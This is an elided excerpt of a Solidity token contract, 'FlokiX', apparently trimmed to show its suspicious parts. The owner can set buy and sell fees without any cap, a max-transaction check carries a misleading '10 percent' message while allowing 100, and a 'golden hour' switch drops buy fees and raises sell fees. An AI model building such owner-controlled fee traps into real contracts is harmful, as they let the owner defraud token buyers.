...
contract FlokiX is Context, IERC20, Ownable {
    ...
    string private _name = "FlokiX";
    string private _symbol = "FLOKIX";
    ...
    uint256 private _maxBuyAmount = 500000000 * 10**6 * 10**9;
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && !_isExcludedFromFee[to]) {
            ...
            // sell
            if (to == pancakePair && from != address(pancakeRouter) && !_isExcludedFromFee[from]) {
    ...
    function setFees(uint256 buyFee, uint256 buyTax, uint256 sellFee, uint256 sellTax) external onlyOwner()
    {
    _buyFee = buyFee;
          _buyTax = buyTax;
          _sellFee = sellFee;
    ...
    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
         require(maxTxPercent <= 100, "Maximum tax limit is 10 percent");
        _maxTxAmount = _tTotal.mul(maxTxPercent).div(
            10**2);
            _maxBuyAmount = _tTotal.mul(maxTxPercent).div(
                10**2);
    }
    function setGoldenHour(bool enabled) external onlyOwner() {
            if (enabled)
          {_buyFee = 0;
          _buyTax = 0;
          _sellFee = 18;
